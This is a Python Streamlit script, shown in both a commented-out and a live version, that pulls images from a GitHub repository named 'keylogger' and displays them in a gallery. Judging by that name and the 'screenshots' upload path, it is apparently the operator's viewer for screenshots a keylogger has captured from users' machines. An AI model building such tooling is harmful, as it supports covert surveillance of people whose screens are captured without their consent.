# import streamlit as st
# import requests
# from PIL import Image, ImageFile
# from io import BytesIO

# # To handle truncated images
# ImageFile.LOAD_TRUNCATED_IMAGES = True

# # GitHub API details
# GITHUB_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/C%3A%5Cuser%20feedback%5Cfeedback%5Cscreenshots"
# HEADERS = {"Authorization": "token add_your_token_here"}

# # Function to get image URLs
# def get_image_urls():
#     response = requests.get(GITHUB_API_URL, headers=HEADERS)
#     if response.status_code == 200:
#         files = response.json()
#         image_urls = [file["download_url"] for file in files if file["name"].lower().endswith(('png', 'jpg', 'jpeg'))]
#         return image_urls[-30:][::-1]  # Get last 30 images in reverse order
#     else:
#         st.error("Failed to fetch images. Check your API token and repository access.")
#         return []

# # Streamlit UI
# st.title("GitHub Image Gallery")
# show_images = st.checkbox("Show Images")

# if show_images:
#     image_urls = get_image_urls()
#     if image_urls:
#         cols = st.columns(5)  # Display images in 5 columns
#         for i, url in enumerate(image_urls):
#             response = requests.get(url, headers=HEADERS)
#             if response.status_code == 200:
#                 try:
#                     image = Image.open(BytesIO(response.content))
#                     with cols[i % 5]:
#                         st.image(image, use_container_width=True)
#                 except OSError:
#                     st.error(f"Failed to load image due to corruption: {url}")
#             else:
#                 st.error(f"Failed to load image: {url}")
























# user image quantity
import streamlit as st
import requests
from PIL import Image, ImageFile
from io import BytesIO

# To handle truncated images
ImageFile.LOAD_TRUNCATED_IMAGES = True

# GitHub API details
GITHUB_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/C%3A%5Cuser%20feedback%5Cfeedback%5Cscreenshots"
HEADERS = {"Authorization": "token add_your_token_here"}

# Function to get image URLs
def get_image_urls(limit=30):
    response = requests.get(GITHUB_API_URL, headers=HEADERS)
    if response.status_code == 200:
        files = response.json()
        image_files = [(file["name"], file["download_url"]) for file in files if file["name"].lower().endswith(('png', 'jpg', 'jpeg'))]
        return image_files[-limit:][::-1]  # Get last 'limit' images in reverse order
    else:
        st.error("Failed to fetch images. Check your API token and repository access.")
        return []

# Streamlit UI
st.title("GitHub Image Gallery")
num_images = st.number_input("Number of images to display", min_value=1, max_value=100, value=30, step=1)
show_images = st.checkbox("Show Images")

if show_images:
    image_files = get_image_urls(num_images)
    if image_files:
        cols = st.columns(5)  # Display images in 5 columns
        for i, (name, url) in enumerate(image_files):
            response = requests.get(url, headers=HEADERS)
            if response.status_code == 200:
                try:
                    image = Image.open(BytesIO(response.content))
                    with cols[i % 5]:
                        st.image(image, use_container_width=True)
                        st.caption(name)  # Display image name
                except OSError:
                    st.error(f"Failed to load image due to corruption: {name}")
            else:
                st.error(f"Failed to load image: {name}")
